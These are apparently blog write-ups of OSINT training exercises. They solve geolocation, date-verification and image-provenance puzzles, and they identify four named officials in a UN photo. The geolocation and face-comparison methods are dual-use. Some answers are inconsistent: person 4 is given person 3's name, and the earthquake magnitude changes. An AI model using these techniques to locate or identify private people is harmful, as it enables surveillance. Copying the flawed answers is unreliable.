Some time of thinking, I decided to check the challenge on the wayback machine on this link and we get our challenge content. From the wayback machine, I was bale to find a bunch of snapshots of the webpage but the snapshot of August 28, 2023 provided me with the page with the contents of the challenge as shown below. With that we have been able to find our challenge and the task briefing as stated below.\nThe internet is a digital ecosystem in constant transformation. Websites change appearance, domains change owners, businesses open and close, and accounts are created and deleted. In July 2023, x.com went from being an almost blank page to redirecting to twitter.com. Your task is to go back in time, until the year 2000, and find the following information within the x.com website: b) The Frequently Asked Questions page. c) The list of members of the management team in July. The frequently asked question page # We shall still use the wayback machine to find the website x.com and search for the FAQ page. From the task briefing, we are required to go to the year 2000. As we look at the site map section, we have different elements as shown below.\nWe can try look at the pages as they are arranged in alphabetical order to see if we shall find the page. This was a tiresome path, I therefore went to the URLs section and searched for the faq page but got nothing of use. Checking the calendar and clicking at different snapshots, I got a faq page which looked as shown below.\nThe page, secure.x.com/help_faq.asp is not there it has an error of 404, I tried searching for the word help as a page on x.com without the subdomain secure as shown below and I was able to find a faq page for the year 2000.\nClicking on the link, we are redirected to a page containing more details as shown below.\nClicking on the snapshot of March 4, 2000, we are redirected to the page shown below.\nThe list of members of the management team in July # For this section I searched under the URLs section for management but I was unable to find a page on the year 2000, but after modifying my search to search for about as shown below, I was able to find our page.\nClicking on the link, we are redirected to the details of when the page was archived as shown below.\nbut after clicking on the March 2, 2000 snapshot we are redirected to our page as shown below.\nWith the above findings, we can confidently say we have finished solving the challenges.\n","date":"21 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-20/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 20)","type":"posts"},{"content":" Exercise 21 # For this challengewe are required to find the location on the chocolate as stated in the task briefing below.\nMaps can appear in the most unusual places. The figure below contains a chocolate bar featuring a map. Next to it you will find the satellite view of the same location. Your task is to: a) Find the coordinates of the location seen in both images. The coordinates of the location # For this section I begun by searching the words on the logo in the chocolate which were DO IT RIGHT as seen on the image of the chocolate. The chocolate is called Puchero, we can now go to their page and see more details about it. There are more chocolates form the company, however, when we navigate to the GET IN TOUCH page, we are met with a map that we can analyze further. From the map, it is almost resembling the map on the chocolate, we shall copy the location and open it on google earth pro and look at it closer with the chocolate image on the side and compare if they truly are the same. From the analysis above we have identified the location on the chocolate was the actual map of where the chocolate company is located.\nAnswer: 41°21'10.3\u0026quot;N 4°41'24.4\u0026quot;W\n","date":"21 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-21/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 21)","type":"posts"},{"content":" Exercise 19 # For this challengewe are provided with a transcript containing communications between two people over phone, however, we can only be able to see one side of the communication. Below is the task briefing.\nThe text below is a partial transcript of a phone call in which you can only read one side of the conversation. Despite the text being completely fabricated for this exercise, the location described is real. Your task is to geolocate where the person was at the time of this fictitious phone call. Below is the transcript that we are required to analyze to find the location of the caller at the time of the call. From the above transcript, I was able to identify some interesting information that could aid in identifying the location as shown below.\nFrom the above image, we are able to identify some crucial information, the person is in a city which half an hour away to the cousin\u0026rsquo;s place near a sea, hence the country is not land-locked. The country the person is in speaks German as one of its languages hence Germany is out of the picture as German is a national language, the place he visited is a prayer area and from the conversion it seems the place is near a water body that connects with the sea as the person says The same water .Furthermore, the city the person is in has buses and train stations nearby.\nThis found information is sufficient enough for us to search online and find the country. As seen above from the identified countries, after going through the countries, Belgium stood out for me as it is near a water body unlike the others apart from Germany but Germany was also ruled out as it speaks German as a national language, however, from Belgium I was able to identify three cities as shown below. Ghent,Bruges and antwerp\nFrom this three cities, I checked the three cities with water bodies that are connecting to the large water body and found two to be of interest to me as shown below. Now on to measuring the distance form the cities to the water bodies, Ghent was close to the described distance in the transcript as shown below. Now diving to the city and search for prayer centers like mosques I found a number of them in the city as shown below. One mosque caught my eye, from the transcript the person seemed to be making a joke about carrying their swimming costume and this mosque Moskee OKBA IBN NAFI had a blue carpet resembling a water body as shown below Looking at the mosque Facebook page, it validated our findings as the mosque seemed to be undergoing some renovation as shown below. Now looking around the area within the mosque on google maps, I was able to identify train tracks and bus stops. With that information, we can clarify that the location of our caller at the time was at Moskee OKBA IBN NAFI\nAnswer:Moskee OKBA IBN NAFI\n","date":"20 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-19/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 19)","type":"posts"},{"content":" Exercise 18 # For this challenge we are required to find the details described in the task briefing as shown below.\nIn May 2023, the world witnessed the coronation of King Charles III at Westminster Abbey in London. Following the ceremony, and similarly to the previous regent, the monarch travelled through the city in a lavish carriage. The route of the 2023 royal procession differed from that of 1953. Your task is to: a) Identify from which exact door Queen Elizabeth II left Westminster Abbey after her coronation. b) Measure the distance travelled by the Queen’s carriage, following the 1953 coronation. c) Estimate the average speed at which the Queen’s carriage travelled. Identify from which exact door Queen Elizabeth II left Westminster Abbey after her coronation. # For this section we shall first start by searching for the coronation celebration of 1953 on youtube, as the event was witnessed world wide, a video of the celebration can not miss as it was streamed. From the video identified above, I was able to locate a scene where we see the queen leaving the Westminster abbey as shown below. From the video we have been able to identify from which door she left but still there is no enough information for us to use to identify the exact door as the Westminster abbey contains many doors that leave the vicinity as shown below from google earth pro. However doing further research on youtube I found another video that is a bit old but we can clearly see the queen entering the vicinity through the same door as shown below. Watching the video further, we get a glimpse of some features we can use to identify from which side the queen left the vicinity as shown below. After ananlysis, I was able to identify the pattern on the video on the building as shown below. We can now clearly identify which door it was as shown below. Answer: 51°29'58.10\u0026quot;N, 0° 7'42.52\u0026quot;W\nMeasure the distance travelled by the Queen’s carriage, following the 1953 coronation # For this section, I had to search for the coronation walk that the queen did in order to find the streets she passed through and use them to measure distance on google earth pro. From the above image, following the link ,we get to this page that has a map of the streets and how she passed through them towards the Buckingham palace as shown below. Using this map we can now map the landmarks where turns were made and use them to measure the distance. Form the image above, we can see clearly the path followed by the queen the distance covered I got it to be as shown below in kilometers and miles.\n7.89 kilometers\n4.90 miles\nHowever, searching for the actual distance covered during the return to the palace form the Westminster abbey I got it to be 5 miles and 8.2 kilometers Following the link identified by AI, I got this page that details how the queen travelled back to the palace and the distance covered as shown below. Hence the distance covered was 5 miles(8.2 kilometers)\nAnswer: 5miles(8.2 kilometers)\nEstimate the average speed at which the Queen’s carriage travelled # From the page we found initially containing the routes the queen covered back to the palace also had details about the time she arrived at each spot as shown below. From this time table we can calculate the time taken to arrive at the palace by finding the difference between arrival and departure times using this online calculator as shown below. From the calculator we have found the time difference in different time formats from hours to seconds. Now to calculate the speed we can do it in two ways miles per hour or kilometers per hour that is dividing the distance covered by time taken (Speed=distance/time) using this online calculator as shown below. Speed in miles per hour is 3miless/hour as shown above. Speed in kilometers per hour is 4.92kilometers/hour.\nAnswer: 3 miles/hour or 4.92 kilometers/hour\n","date":"19 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-18/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 18)","type":"posts"},{"content":" Exercise 17 # For this challenge we are required to find the dates when the blogs were posted, however, the date on the blogs are not normal dates as said in the task briefing below.\nThe majority of countries around the globe use the Gregorian calendar. However, there are other systems to measure and organise time. Below you will find three news articles from countries that have not adopted the Gregorian calendar. Your task is to find out when the articles were published, according to the Gregorian calendar. 1. “ኢትዮጵያዊው አትሌት የቶኪዮ ማራቶን ባለድል ሆኗል !” 2. “प्रहरीमा ५ हजार ४४४ जनाका लागि भर्ना खुल्यो” 3. “در پنجمین شب جشنواره موسیقی فجر کدام گروه‌ها پا به صحنه می‌گذارند؟” ”The Gregorian calendar is the calendar used in most parts of the world. It went into effect in October 1582 following the papal bull Inter gravissimas issued by Pope Gregory XIII, which introduced it as a modification of, and replacement for, the Julian calendar. The principal change was to space leap years differently so as to make the average calendar year 365.2425 days long, more closely approximating the 365.2422-day \u0026ldquo;tropical\u0026rdquo; or \u0026ldquo;solar\u0026rdquo; year that is determined by the Earth\u0026rsquo;s revolution around the Sun.” According to wikipedia\nWe can be able to view countries that use the gregorian calendar from this link.\nWith that small introduction we can now find the dates when the blogs were published.\n“ኢትዮጵያዊው አትሌት የቶኪዮ ማራቶን ባለድል ሆኗል !”(\u0026quot;Ethiopian athlete wins Tokyo Marathon!\u0026quot;) # We have been provided with a link to the article, we can navigate to the link and see how the article looks like as shown below.\nSince I know how the Ethiopian flag looks like, I clearly knew the post was made in amharic language and the post was made in 2020, we can now translate the page to English and read what it is about.\nInteresting, analyzing the image further, it seems the marathoner won the tokyo 2020 marathon. To find more information, I inspected the source code to see if we will find information on when the post was published as shown below.\nFrom the source code it was published on March 1, 2020 , we can search further to see if this post was truly published on this date.\nLook what we found, the same image as the one from the article, following the link we can clearly see the winner is the same person as from the article and it was on March 1, 2020\nAnswer: March 1, 2020\n“प्रहरीमा ५ हजार ४४४ जनाका लागि भर्ना खुल्यो”(\u0026quot;Police recruitment opens for 5,444 people\u0026quot;) # The link to the article directs us to this page shown below.\nat first I did not know the language but after translating the page I found it was in nepalese as shown below.\nAlthough the post had a date when it was published, the date was still looking weird to me as shown below.\nAt First even translating the page,I was not able to get the time shown above which seems to be the tag for when the post was made but transalting the page to its original language and using google translate, I was able to find the date as shown below.\n2072, it seems we are in a different earth as in flash series, we are in some earth 12 or something 😅. Anyway, from the translated data, we have some useful information the month magh ,year 2072 and day 17 we can use a calendar converter for nepalese calendar and see what day it was as shown below.\nBefore conversion.\nAfter conversion, we get our date January 31, 2016\nAnswer: January 31, 2016\n“در پنجمین شب جشنواره موسیقی فجر کدام گروه‌ها پا به صحنه می‌گذارند؟”(“Which bands will take the stage on the fifth night of the Fajr Music Festival?”) # For this one as well we have the link to the article provided to us just like the other articles. Navigating to the article we are met with a page written in Persian language as from the translation of the article title.\nTranslating the page, we get to see the published date as shown below.\nesfand to me looks like we have a month but with this small translation, it is not enough information for us to use, I decided to translate the date back to its original language and use google translate to convert the date alone and see what we get as shown below.\nMarch 2, 1401 with this translation we can now say we have the year 1401, and day 2 as the month we earlier got it to be Esfand as some times google translate may mistranslate some words, furthermore, going through the blog this was a musical festival conducted in more than one day as shown below.\nNow we can use the data (Esfand 2 1401) we have gathered about the date when the post was made and look for a Persian calendar translator to give us the date when the post was made. I found this translator online.\nAfter translating our date, we got the day as shown above February 21, 2023\nAnswer: February 21, 2023\nLessons learned # From this OSINT challenges, I was able to learn an important skill in OSINT, DO NOT ASSUME as for each challenge I inspected the source codes for the times of publication for each post but had to do more research online to verify if the dates were truly correct.\n","date":"18 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-17/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 17)","type":"posts"},{"content":" Exercise 16 # This challenge was quite mind draining, we are required to find the location where the military aircraft was flying over as described in the task briefing below.\nOn November 25, 2020, a Twitter user shared the photo below. It depicted a military aircraft flying over an “undisclosed location”. Your task is to disclose that location. A clearer image for the same is shown below.\nFinding the location # For us to find more details, we shall perform a reverse image search and see if we can find more information about the aircraft.\nFrom tineye, we got some interesting information, I shall be looking into the alamy source as it contains more stock images for the same.\nForm the image we have gotten some information Operation inherent resolve, May 31,2017, battle areas, Air force A-10 Thunderbolt II with this information we can search to find more details about the operation and where it was being conducted on May 31,2017 and it is likely to be in a war tone country and from the picture, it could in a semi-arid regions.\nWe now know the operation was a joint task force between US, Iraq and Syria. Searching on alamy images for the same operation and filtering for the date May 31,2017 ,we get more images that can help us identify our location and we are also able to find our challenge image as shown below.\nGoing through the photos, I was able to identify this photos that have unique geographical structures that can aid in locating our location.\nWith those images we can now play around with google earth pro to find the locations identified. This route was very tiresome, however, doing more research about the mission, I came across this document giving details of locations where strikes were made.\nThe analysis from one of the photos I found is as shown below.\nWe have been able to identify one photo and where the aircraft was at the moment.\nThe second place from the image collections we have been able to locate it.\nAfter a while of roaming through the map, I was able to find the location of where our air-craft was located as shown below.\nAnswer: 37°39'21.98\u0026quot;N, 38° 5'41.83\u0026quot;E\n","date":"17 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-16/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 16)","type":"posts"},{"content":" Exercise 15 # For this challenge we are given a picture giving a description of a telescope we have to find it and locate where it is placed as described in the task briefing below.\nThe image below is a screenshot taken from a CIA declassified document. It depicts a caption report of an undisclosed photo taken by an agent. The text mentions a telescope “being assembled at factory“. Your task is to find: a) A photo that matches the description on the caption report. b) The exact location of where the telescope was placed once completed. A photo that matches the description on the caption report # From the above photo, we can see some clear descriptions of the telescope. The information I used is telescope for the university of bonn, built at the askania factory, jan 18, 1953 with this information we can search for the telescope on google and see what we shall find as shown below.\nInteresting findings, going to the first link and searching through the page, I got an interesting image with some information form our challenge document as shown below.\nTo verify if this is our telescope, I searched for it and see its elements if they match the description on the document.\nAs seen above from this source, we can now verify the telescope we fund matches the description on the document.\nTherefore the telescope being identified is as shown below.\nThe exact location of where the telescope was placed once completed # From this site,we got a description of the telescope and where it is located at the Hoher list observatory as shown below.\nSearching on the same page again for Tower 1 I got an image of the tower as seen below.\nWe can search on google maps for the Bonn observatory and see if we can be able to locate the tower with the following patterns as described below.\nFrom google maps we have been able to identify a tower with the surrounding descriptions from our analyzed image above as shown below.\nTo confirm if it is the tower we can see if there is a street view of the place and see if we can identify if it is truly the tower.\nWith that evidence we can now clearly identify that our tower is as shown below.\nAnswer: 50°09'42.6\u0026quot;N 6°50'54.0\u0026quot;E\n","date":"15 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-15/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 15)","type":"posts"},{"content":" Exercise 14 # For this challenge we are required to find the magnitude of the earthquake and the coordinates of the camera used to record the place as described in the briefing below.\nThe video below was recorded during an earthquake. Please find the answer to the following questions: a) What was the magnitude of this earthquake? b) What are the coordinates of where the camera was likely located in order to record this scene? link to the video is here.\nWhat was the magnitude of this earthquake # For this question, we shall first start by identifying the location on the video. Just like reverse image search there are tools used to do reverse video search, we need to do a reverse image search to see if the video was only from Sofia Santos or someone else.\nThe tool we shall use for this task is called InViD, where we shall upload the video link to it and it will generate images that we can ten do a reverse image search of them as shown below.\nAs seen above snapshots of the video were taken and through the tool we can do a reverse image search of the photos.\nAs seen above we have a youtube link of the same place,however the video caption says it was 2018 and from the cctv photo-age it is dated 2016 but we have some information from the youtube video of the place which is Bucharest,Romania as shown below,.\nWe can search on google to see the magnitude of the earthquake of 2016 in Romania.\nFrom our search we get a magnitude of 5.6.\nLet’s search for the government announcement of Romania concerning the earthquake and see if he magnitudes are the same but I was unable to find some concrete information. However, going back to the youtube video we found earlier of our challenge video and looking at the comments someone has commented that there are rarely earthquakes in Romania.\nSearching if there were earthquakes experienced by countries bordering Romania, I found some interesting information on Moldova country as shown below.\nAnswer: 5.8\nWhat are the coordinates of where the camera was likely located in order to record this scene? # For this section we shall go back to our video and try to identify some features as shown below.\nWith this findings, I searched for malls first in Romania and see if I can find anything related to my images above, however, this path was tiresome, I therefore went back and did a reverse image search with yandex from the video reverse search we did earlier and found this particular image.\nGoing to the link, I found the exact video of the event as shown below.\nTranslating the video caption name, I got the following.\nEarthquake Chisinau now I can further crop the image to this particular buildling and search for it in chisinau as shown below.\nWe have been able to find the building atrium shopping mall and where it is located, Moldova near Bic river.\nBuilding from google earth pro.\nWe can now try to pin point where the camera was.\nBelow is an image showing the coordinates.\nAnswer: 47°00'57.6\u0026quot;N 28°51'14.1\u0026quot;E\n","date":"14 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-14/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 14)","type":"posts"},{"content":" Exercise 12 # This challenge was a medium one for me, playing around with reverse image search and searching for the heat map. Below is the task briefing.\nThe screenshot below shows satellite imagery from a coastal area. Each red pixel represents a 30 metre centre point containing a thermal anomaly. The data is from January. Please analyse the screenshot and answer the following questions: a) Which website was used to produce the image below? b) Which is the country seen in the image? c) The screenshot shows data from a specific date. Which is the date? Which website was used to produce the image # For this section I did a reverse image search as shown below and was able to find the site after verifying the resemblance of the site and the image above.\nClicking on the link, we are redirected to this site shown below.\nand from the site their is a post made that shows FIRMS(Fire information for Resource Management System), searching online for the site we find the following results.\nClicking on the second link, I got some interesting information where by I had to put the site on another window along side the challenge image and analyzed the two and some identifiers from the challenge image verified this site to be the one where the screenshot was taken from as shown below.\nAnswer: [NASA FIRMS](https://firms.modaps.eosdis.nasa.gov/map/#d:24hrs;@0.0,0.0,3.0z)\nWhich is the country seen in the image # From the previous question we have solve, when we were doing reverse image search, we found information that resembled our image as shown below.\nTo confirm if the findings were true, I had to place the images along side each other and verify our findings to be true as shown below(I used the one indicated ‘The Old Vine Conference)\nThe two images were not looking similar but since we are searching for the country I decided to start with Chile that is indicated in the blog site we found for the old vine conference to look at the coastal borders, moreover, the coastal region seems to be bordering a water body to the west.\nAs seen above after searching for the country Chile on NASA FIRMS’ site and looking at the coastal region, I found a region that resembles our image as shown above.\nAnswer: Chile\nThe screenshot shows data from a specific date. Which is the date? # For this section I had to go back to the task briefing, we are told The data is from January using this data I searched on google fire in Chile that happened in January as shown below.\nIt appears Chile experienced wild fires on January 2017 with this we can go back to NASA FIRMS and tweak the dates to find the exact date, as shown below after some tweaking we got the exact date.\nAnswer: January 26,2017\nWith that we have solved our entire challenge.\n","date":"13 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-12/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 12)","type":"posts"},{"content":" Exercise 11 # This challenge was quite hard for me, we are provided with an image that is not completely clear, however, we are required to find the name of the four individuals on the image as stated in the task briefing as shown below.\nThe photo below depicts four individuals. Your task is to identify them all. Above is the image we are required to use to find the name of the individuals on the image.\nWe shall start by doing a reverse image search to see if we can find any information about the image.\nWe have found some information skhirat Agreement and some links, I decided to follow the one for United Nations.\nThe photo is by UNSMIL(United Nations Support Mission in Libya). We can head to UNSMIL and look around if we can get more information about the image but from the photo we can identify some information as shown below.\nAs analyzed form the image above we can start searching for one individual at a time, furthermore as from our searches, this event was conducted by UN. As I have witnessed, more than one event conducted by the UN are usually filled with audience and important guest of the events surely seat at the front row. From UNSMIL, I was able to identify our photo and more with individuals on our photo as shown below.\nAnalysis from the challenge image\nI tried to do a reverse search for the people identified but got no useful information however, searching for the agreement form they signed got me a bit of information. With this form, I could search for the event further.\nhere is a clearer image.\nSearching the internet, I was able to find one of the members in the challenge photo as shown below.\nPerson 1 # Following the link, we are given clearly the name as shown below.\nSearching his name online, we get more details about the person.\nSearching further his full name is Moustafa Abushakor Ghaith\nPerson 2 # I found an image of this member\nWhat made come to conclusion he was among the members in the photo was after I carefully analyzed the hair pattern of the individual in the challenge photo and this photo.\nscrolling through the photos, I found the same person again signing the document we identified earlier as shown below.\nIf we zoom a little bit closer, we can be able to identify the location of where the person was signing as shown below.\nwith that we can get the name of the person from this file using google translate.\nUsing google translate, it was unable to get the whole name as shown below.\nhowever, I searched for the document that was signed and found his name after searching through all the names in this document . His name is Salih Hama bakdah\nPerson 3 and 4 # After finding this document and searching the names, I was able to identify the two remaining people. As shown below.\nperson 3 (فضيل محمد الأمين )Fadil Mohamed Alamen\nFor me to identify it was this man shown below was the cheeks after looking through some of his photos and comparing it with the one on the challenge photo.\nperson 4 (محمد سعد امعزب)Fadil Mohamed Alamen\nWhat enabled me to identify person 4 as shown above was the following identifiers as shown below.\nThis challenge was not easy but I learnt a lot concerning how to study human facial structure for facial recognition,however there are systems nowadays that can do this automatically without manual intervention most of the time thanks to artificial intelligence.\n","date":"12 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-11/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 11)","type":"posts"},{"content":" Exercise 10 # For this challenge we are required to analyze the photos in the tweet to answer the questions that are in the task briefing as detailed below.\nA Twitter user shared three photos of an event. Please answer the following questions: a) Which event is being celebrated in the photos? b) Which two photos were taken by the same person? c) The two photos mentioned above were taken in the same city. The photographer was previously in a different city. Find out the name of that city. Which event is being celebrated in the photos? # For this section we can read the tweet to see if we can find some interesting information that can help us identify the event.We have some information we can search to find the event zangbeto dolls , African voodoo festival and mysticism .\nSearching online, the zangbeto doll is a traditional Vodún guardians of the night among the Ogu (or Egun) people of Benin, Togo, and Nigeria. This tells us the festival is usually conducted in west African countries. Looking at the images section, I found an image which on clicking I got other images and the name of the festival as shown below.\nAnswer: Benin voodoo festival\nWhich two photos were taken by the same person? # From the previous question, we saw one image from which we can search the photographer and see if he has more images for the same event.\nClicking on the highlighted image above, I got more images for the same but there was one which provided more details from getty images as shown below.\nFound the name of the photographer, we can search the name in the getty images gallery and see more photos that he has.\nand we have found another photo by the same photographer. Hence the two photos that were taken by the same photographer are as highlighted below.\nThe photographer was previously in a different city. Find out the name of that city. # For this section we can search for the photographer’s social media and see if he has posted some information of his whereabouts, I will start with my favorite platform, twitter.\nI found a post by him, clicking on it we get details of where he was as shown below.\nBut for us to verify we shall search the place in google maps and see where it is .\nWe now have our answer, he was in Cotonou Benin.\nAnswer:Cotonou, Benin\n","date":"11 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-10/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 10)","type":"posts"},{"content":" Exercise 9 # This challenge was interesting, we are given a video to analyze and answer the questions that follow in the task briefing as shown below.\nThe video below was shared by the Visit Tirana Twitter account on February 16, 2023. Please answer the following questions: a) To the best of your knowledge, at what time was the video recorded? b) Find the coordinates of where the person was walking at the time of the recording. Here is the video link. and the tweet as well form twitter\nTo the best of your knowledge, at what time was the video recorded? # From the tweet itself, we have some interesting information.\nThe name of the photographer Eriseld Myrto The name of the city where the recording was done Tirana,Albania with that information we can start by searching if visit tirana has a website which I found using some google dorking as shown below.\nHowever this did not give me much information, but doing further searches online, I found that the photographer had different alias names on instagram, tiktok, facebook. Form Instagram, we can inspect the source code to get the time when the video was recorded.\nFrom the screenshot above we can only see the date when it was uploaded but when we inspect the source code we get more details such as time as shown below.\nnow we have the time when the video was uploaded.\nAnswer: 2023-02-16T16:48:43.000Z\nFind the coordinates of where the person was walking at the time of the recording. # For this section,we shall review the video again taking note of some important features we can use to identify the place easily as shown below.\nThere is a two identical buildings with one taller than the other, there is a walk path at the middle of the road that seems to be a bike path and pedestrians can also use for walking.\nWith that lets try and perform a reverse image search and see if we can identify the location of the buildings.\ntirana garden building is how the building was identified. We can search that building up on earth pro and see the area.\nwe have been able to identify the street, we can now play around with street view to see where the person was standing.\nForm the above image we have made a side by side analysis and found where the photographer was standing, we can now get the coordinates of the position.\nAnswer:41.3270062,19.8072923\n","date":"10 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-9/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 9)","type":"posts"},{"content":" Exercise 8 # In this challenge we are provided with an image of a gazette where we are required to achive the following taks.\nPlease answer the following questions: a) What was the audience applauding? b) When was the photo taken? c) What is the name of the venue? What was the audience applauding? # For this section, first we shall use google translate to change the words into a language we can read easily as shown below.\nWith that we can search the news outlet which is epoch times and the performance was by shen yun.\nAnswer: Shen Yun's performance of 2023 world tour\nWhen was the photo taken and the name of the venue? # For this section we shall perform some reverse image search to see if we can find anything of interest to us.\nAs shown above, we are able to find some details about the event. Interesting, we can now easily find more information about the event by accessing the two links I have identified in the image.\nFrom this link we got all the information about the image, the picture was taken on January 7,2023.\nsearching the name of the venue on google maps and having a street view of the same, we can easily verify the location of the venue.\nAnswer: Date when photo was taken:Janary 7,2023 venue: Chrysler Hall in Norfolk, Virginia\n","date":"8 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-8/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 8)","type":"posts"},{"content":" Exercise 6 # For this challenge we are required to verify if the image posted on the journalist’s twitter page is true. In this lab we shall be learning the skill for data verification as the internet is filled with a lot of misinformation, no matter who says something on the internet, the data has to be verified as in the case above, the journalist is a verified journalist but the photo posted has to be confirmed even though the information seems to be true. In an OSINT investigation, data found has to be verified to be factual be fore coming up with a report.\nBelow is the task briefing.\nTask briefing: On January 19, 2023, a journalist with almost 140k followers on Twitter shared an image of a destroyed vehicle amidst a large cloud of smoke and fire. The tweet said: “BREAKING: TTP carried out a suicide attack on a police post in Khyber city of Pakistan that killed three Pakistani police officers.“ The photo is not of the event described by the journalist. a) Verify the statement above. From the tweet the post was made on January 19, 2023 but when I did a reverse image search I got more than one result form tin-eye as shown below some images indexed dating as old as 2009.\nWith the above findings it is clear the post was a false information source for the case. However doing further research, the bombing scene identified above happened in Baghdad, the image metadata info found form this link form the Tineye reverse image searches.\nThe incident happened in august 7, 2006 in Waziriya, Iraq as seen above.\n","date":"6 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-6/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 6)","type":"posts"},{"content":" Exercise 7 # This challenge was fun to do, below is the task briefing.\nThe photo below was taken a few years ago in a beautiful city. Your task is to find the answers to the following questions: a) Where was the photo taken? b) In which year was the photo taken? c) The big poster on the right contained a link to a website. What was the link? to get the full image you can access it from this link.\nWhere was the photo taken? # For this section, I did a reverse image search using google lens and found the name of the location as shown below.\nFrom the above search we now know the location is lisbon where there is a mall called vasco da gama, but wait with history I know vasco da gama was a Portuguese explorer, with that we can now head to google maps and search for vasco da gama mall in Lisbon, Portugal and see where the image was taken as shown below.\nAs seen above the structure in our image is right in front of the vasco da gamma mall, from the image challenge, the photo was taken from the top of the escalator. The entire place is called Parque das Nações.\nAnswer: **Parque das Nações, Lisbon Portugal**\nwhich year was the photo taken and What was the link ? # For this section, we had to find the poster in the image in which it is an event advert form there we shall get the year when the photo was taken as event adverts are usually dated when they will happen.\nWe shall play around with google earth pro street view and time adjustments to see if we can find the poster from the image as shown in the challenge photo and probably find the link in the poster as well.\nWe have been able to identify where the poster was placed on the wall. Tried to play around with the street on google earth pro but I was unable to find the year of the poster, I decided to look up closely on the image and try to read the readings on the poster by cropping the image to have the poster alone and perform a reverse image search for the poster as shown below.\nthe image of the poster cropped from the main picture.\nPerforming reverse image search, I was able to get the name of the event and write-ups too as well. Now the event is Tutakhamon this is according to venice searching on google for the same event that happened on Portugal I found the the following.\nThe event was called tutankamon in Portuguese. Searching again for the event, I found the exact poster as shown below.\nFollowing the Facebook post, I was able to find the year and link on the poster as shown below.\nAnswer: year=2019, link= www.tutankamon.pt\n","date":"6 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-7/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 7)","type":"posts"},{"content":" Exercise 5 # In this challenge we are required to find the location of the bears as stated in the task briefing below.\nTask briefing: The image below is a screenshot from a zoo live cam. It was taken on January 15, 2023 at around 2pm local time. Please answer the questions below: a) In which zoo are these polar bears located? b) What was the temperature at the time of the screenshot? c) What were the exact coordinates of where the bears were lying down? To download the image, you can access it form this link.\nwhich zoo are these polar bears located # For this section we shall start by doing a reverse image search of the image and see if we can find a picture resembling the location shown on the image. After doing the reverse search, I got a writeup to this challenge but that is not what I was intending to get, therefore reverse image search did not serve my purpose.\nFrom the task briefing we have some information we can use to get the location of the zoo,screenshot from a zoo live cam .This information will help find the zoo as it seems this zoo is unique as there are live cams that record the bears.\nAs seen above there are two zoos available, however, going through the Alaska zoo, I found nothing close to the photo that was taken but going through the san diego live cam feed on their website, I found the location of the photo with some identifying factors form the challenge photo as shown below.\nImage captured from the San Diego zoo live feed camera.\nIdentifying factors from the challenge picture.\nWith that we have found the name of the zoo where the polar bears are located.\nAnswer: San Diego zoo\nThe temperature at the time of the screenshot # This one was interesting as I got to find out that America usually has historical data of temperature for different areas, this information I was able to get it after doing some searches online on how to get temperature data of pat days. The information for the temperature I was able to get it form this site.\nForm the task briefing, the image was taken on January 15, 2023 at around 2pm local time with this, we can be able to get the approximate temperature.\nThe closest time range I could get close to 2pm was as shown below.\nThe temperature is in Fahrenheit, we can convert to degrees Celsius using this tool as shown below.\nThe temperature is approximately 17 degrees Celsius.\nAnswer: 62 fahrenheit or 16.67 degrees celsius\nThe exact coordinates of where the bears were lying down # For this section we shall use google map to find the exact coordinates of where the bears were lying as shown below.\nFrom the image in the challenge, we can see that there is an identifying factor that will aid us in getting the location of where the bears were lying.\nImage analysis form the challenge photo.\nAs shown above the bears were lying close to the area with less grass on the edge(Less bushy edge) from the google maps, we can identify the area where this area is located as shown below.\nFrom the image above we can now find the exact coordinates of where the bears were lying.\nAnswer: 32°44'03.9\u0026quot;N 117°09'16.6\u0026quot;W\n","date":"5 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-5/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 5)","type":"posts"},{"content":" Exercise 4 # This challenge was quite easy as seen below are the tasks briefings.\nTask briefing: This is a photo of a resort located on an island. a) What is the name of the resort? b) What are the coordinates of the island? c) In which cardinal direction was the camera facing when the photo was taken? We can access the image from this link.\nThe name of the resort # For this section we could do a reverse image search to get the name of the resort, for me I used this extension that allows you to search for the image using image searchers such as yandex,TinEye, bing and google lens\nHowever,going through the various searches found in the different search engines, google lens and Bing were the only one that gave me the exact image that I was looking for as shown below.\nResults as per google lens.\nResults as per Bing search.\nAs seen above Bing was also able to find a write-up done by another person but I preferred focusing on finding the results on my own. As for google lens, we were able to find the image and we found a website for the resort containing the image as the background of the website as shown below.\nAnswer: Oan Resort\nThe coordinates of the island. # For this section we are required to search for the co-ordinates of the resort, this was easy as we could search the resort straight from google maps and get the exact coordinates of the island as sown below.\nAnswer: 7°21'49.0\u0026quot;N 151°45'22.4\u0026quot;E\nCardinal direction the camera was facing when the photo was taken. # For this section we shall play around with google earth pro using the coordinates from google maps and put the image along side the window for google earth pro to get the exact cardinal direction the camera was facing as shown below.\nAs shown above, we have found the exact cardinal direction from which the camera was facing when the picture was taken.\nAnswer: North West\n","date":"4 